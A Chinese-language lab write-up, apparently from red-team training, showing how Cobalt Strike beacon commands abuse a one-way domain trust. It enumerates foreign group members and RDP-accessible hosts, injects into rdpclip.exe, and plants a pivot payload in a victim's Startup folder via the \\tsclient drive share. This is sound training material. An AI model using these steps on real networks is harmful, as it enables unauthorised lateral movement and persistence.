前提：如果域 A（cyberbotic.io） 信任域 B（zeropointsecurity.local），则域 B 中的用户可以访问域 A 中的资源，但域 A 中的用户不应该能够访问域 B 中的资源

利用原理：利用 RDP 驱动器共享技术

由于本域cyberbotic.io是单方面信任zeropointsecurity.local，所以本域不能搜索到zeropointsecurity.local的信息


但是可以查找本域中的外域组
```
beacon> powershell Get-DomainForeignGroupMember -Domain cyberbotic.io

GroupDomain             : cyberbotic.io
GroupName               : Jump Users
GroupDistinguishedName  : CN=Jump Users,CN=Users,DC=cyberbotic,DC=io
MemberDomain            : cyberbotic.io
MemberName              : S-1-5-21-3022719512-2989052766-178205875-1115
MemberDistinguishedName : CN=S-1-5-21-3022719512-2989052766-178205875-1115,CN=ForeignSecurityPrincipals,DC=cyberbotic,DC=io
```


查找jump users组可以登录的本域计算机
```
beacon> powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

上面查询的等价操作
```
beacon> powershell Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

这里表明Jump Users里面的用户（比如zeropointsecurity.local的jean.wise可以登录这两台计算机）

在sql01.zeropointsecurity.local，以jean.wise的身份登录sql-1.cyberbotic.io


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661307993881.jpg)


在sql-1，使用net logons查看登录session
```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
sql-1

beacon> net logons
[*] Tasked beacon to run net logons on localhost
[+] host called home, sent: 105059 bytes
[+] received output:
Logged on users at \\localhost:

ZPS\jean.wise
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308209479.png)

查看进程列表


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308247969.jpg)

注入rdpclip.exe这个进程


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308385718.png)

拿到beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308458491.jpg)

在sql-1用system的beacon做一个pivot lisenter


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308533720.png)

生成一个payload


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308621315.png)

```
beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 174b     fil     05/15/2021 19:00:25   desktop.ini
 281kb    fil     05/15/2021 20:31:00   pivot.exe
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308876913.jpg)

在sql01.zeropointsecurity.local确认已上传


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308836986.jpg)


重新登录sql01.zeropointsecurity.local，接收到beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661309056371.png)
